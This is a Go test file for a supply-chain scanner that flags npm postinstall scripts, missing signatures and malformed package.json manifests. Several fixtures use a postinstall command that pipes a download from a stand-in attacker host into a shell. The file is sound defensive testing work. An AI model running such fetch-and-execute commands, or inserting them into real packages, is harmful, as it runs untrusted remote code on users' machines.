package supplychain

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sentari-dev/sentari-agent/scanner/deptree"
)

func TestDetectInNodeModules_postinstallScript(t *testing.T) {
	root := t.TempDir()
	pkgDir := filepath.Join(root, "evil-pkg")
	mustMkdir(t, pkgDir)
	mustWrite(t, filepath.Join(pkgDir, "package.json"), `{
		"name": "evil-pkg",
		"version": "1.0.0",
		"scripts": {"postinstall": "curl evil.com | sh"}
	}`)
	signals, err := DetectInNodeModules(context.Background(), root)
	if err != nil {
		t.Fatalf("detect failed: %v", err)
	}
	if len(signals) != 2 {
		t.Fatalf("expected 2 signals (postinstall + unsigned), got %d: %+v", len(signals), signals)
	}
	byType := map[string]deptree.SupplyChainSignal{}
	for _, s := range signals {
		byType[s.SignalType] = s
	}
	post, ok := byType["postinstall_script"]
	if !ok || post.Severity != "info" || post.PackageName != "evil-pkg" {
		t.Errorf("postinstall signal wrong: %+v", post)
	}
	if _, ok := byType["unsigned"]; !ok {
		t.Error("expected unsigned signal since attestation absent")
	}
}

func TestDetectInNodeModules_provenanceAttested(t *testing.T) {
	root := t.TempDir()
	pkgDir := filepath.Join(root, "good-pkg")
	mustMkdir(t, pkgDir)
	mustWrite(t, filepath.Join(pkgDir, "package.json"), `{
		"name": "good-pkg",
		"version": "2.0.0",
		"scripts": {"postinstall": "node prepare.js"}
	}`)
	mustWrite(t, filepath.Join(pkgDir, ".signature.json"), `{"signed":true}`)
	signals, err := DetectInNodeModules(context.Background(), root)
	if err != nil {
		t.Fatalf("detect failed: %v", err)
	}
	types := map[string]bool{}
	for _, s := range signals {
		types[s.SignalType] = true
	}
	if !types["postinstall_script"] || !types["provenance_attested"] {
		t.Errorf("expected postinstall + attested, got %v", types)
	}
	if types["unsigned"] {
		t.Error("unsigned should NOT be emitted when attestation present")
	}
}

func TestDetectInNodeModules_noScriptNoSignals(t *testing.T) {
	root := t.TempDir()
	pkgDir := filepath.Join(root, "boring-pkg")
	mustMkdir(t, pkgDir)
	mustWrite(t, filepath.Join(pkgDir, "package.json"), `{"name":"boring-pkg","version":"1.0.0"}`)
	signals, err := DetectInNodeModules(context.Background(), root)
	if err != nil {
		t.Fatalf("detect failed: %v", err)
	}
	if len(signals) != 0 {
		t.Errorf("expected no signals for boring pkg, got %+v", signals)
	}
}

// TestDetectInNodeModules_deepNestedManifestIgnored proves that only a
// package.json that is a direct child of node_modules/<pkg> is treated as a
// real installed package. A package.json nested deeper inside a package
// (subpath-export stubs, bundled test fixtures) must NOT emit signals.
// Fixture: node_modules/foo/package.json (real, has a postinstall script)
// plus node_modules/foo/test/fixtures/bar/package.json (stub, also has a
// script) → only foo signals.
func TestDetectInNodeModules_deepNestedManifestIgnored(t *testing.T) {
	root := t.TempDir()

	fooDir := filepath.Join(root, "foo")
	mustMkdir(t, fooDir)
	mustWrite(t, filepath.Join(fooDir, "package.json"), `{
		"name": "foo",
		"version": "1.0.0",
		"scripts": {"postinstall": "node build.js"}
	}`)

	// Deeply nested stub manifest — a bundled test fixture, NOT an
	// installed package. It even declares a script to prove it would emit
	// a spurious signal if the walker mistook it for a real package.
	barStub := filepath.Join(fooDir, "test", "fixtures", "bar")
	mustMkdir(t, barStub)
	mustWrite(t, filepath.Join(barStub, "package.json"), `{
		"name": "bar",
		"version": "9.9.9",
		"scripts": {"postinstall": "curl evil.com | sh"}
	}`)

	signals, err := DetectInNodeModules(context.Background(), root)
	if err != nil {
		t.Fatalf("detect failed: %v", err)
	}
	for _, s := range signals {
		if s.PackageName != "foo" {
			t.Errorf("expected signals only for foo, got signal for %q: %+v", s.PackageName, s)
		}
	}
	// foo must still emit its postinstall + unsigned signals.
	types := map[string]bool{}
	for _, s := range signals {
		types[s.SignalType] = true
	}
	if !types["postinstall_script"] {
		t.Errorf("expected foo postinstall_script signal; got %+v", signals)
	}
}

// TestDetectInNodeModules_bomManifestParses proves a BOM-prefixed
// package.json (EF BB BF) is stripped before json.Unmarshal so the package
// still emits its supply-chain signals instead of silently parse-failing.
func TestDetectInNodeModules_bomManifestParses(t *testing.T) {
	root := t.TempDir()
	pkgDir := filepath.Join(root, "bommy")
	mustMkdir(t, pkgDir)
	bom := []byte{0xEF, 0xBB, 0xBF}
	body := []byte(`{
		"name": "bommy",
		"version": "1.2.3",
		"scripts": {"postinstall": "node prepare.js"}
	}`)
	if err := os.WriteFile(filepath.Join(pkgDir, "package.json"), append(bom, body...), 0o644); err != nil {
		t.Fatal(err)
	}
	signals, err := DetectInNodeModules(context.Background(), root)
	if err != nil {
		t.Fatalf("detect failed: %v", err)
	}
	var found bool
	for _, s := range signals {
		if s.PackageName == "bommy" && s.SignalType == "postinstall_script" {
			found = true
		}
	}
	if !found {
		t.Errorf("BOM'd package.json did not parse — expected bommy postinstall_script signal; got %+v", signals)
	}
}

// TestDetectInNodeModules_malformedManifest feeds truncated, garbage, and
// wrong-typed package.json bytes and asserts the walker degrades gracefully:
// no panic, and no spurious signal for a manifest it cannot parse. A
// node_modules tree is attacker-influenceable (it sits in a scanned project),
// so a crash or a fabricated signal here is a supply-chain-report integrity
// bug, not just a parse miss.
func TestDetectInNodeModules_malformedManifest(t *testing.T) {
	cases := []struct {
		name    string
		content string
	}{
		{"empty", ""},
		{"whitespace only", "   \n\t\n"},
		{"truncated object", `{"name":"foo","version":"1.0.0"`},
		{"truncated mid-key", `{"name":`},
		{"garbage tokens", `}}}not json@@@`},
		{"control bytes", "\x00\x01\x02{\"name\":\"foo\"}"},
		{"json array not object", `["name","foo"]`},
		{"json scalar", `12345`},
		{"json null", `null`},
		{"wrong-typed name (number)", `{"name":123,"version":"1.0.0"}`},
		{"wrong-typed scripts (string)", `{"name":"foo","scripts":"curl evil|sh"}`},
		{"wrong-typed scripts (array)", `{"name":"foo","scripts":["postinstall"]}`},
		{"wrong-typed script body (number)", `{"name":"foo","scripts":{"postinstall":42}}`},
		{"missing name", `{"version":"1.0.0","scripts":{"postinstall":"x"}}`},
		{"empty name", `{"name":"","scripts":{"postinstall":"x"}}`},
		{"deeply nested arrays", `{"name":"foo","scripts":` + strings.Repeat("[", 2000) + strings.Repeat("]", 2000) + `}`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			pkgDir := filepath.Join(root, "pkg")
			mustMkdir(t, pkgDir)
			mustWrite(t, filepath.Join(pkgDir, "package.json"), tc.content)
			// Must neither panic nor fabricate a signal from unparsable bytes.
			signals, err := DetectInNodeModules(context.Background(), root)
			if err != nil {
				t.Fatalf("detect returned error on malformed manifest: %v", err)
			}
			if len(signals) != 0 {
				t.Errorf("expected no signals for malformed manifest %q, got %+v", tc.name, signals)
			}
		})
	}
}

func mustMkdir(t *testing.T, p string) {
	t.Helper()
	if err := os.MkdirAll(p, 0o755); err != nil {
		t.Fatal(err)
	}
}

func mustWrite(t *testing.T, p, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}
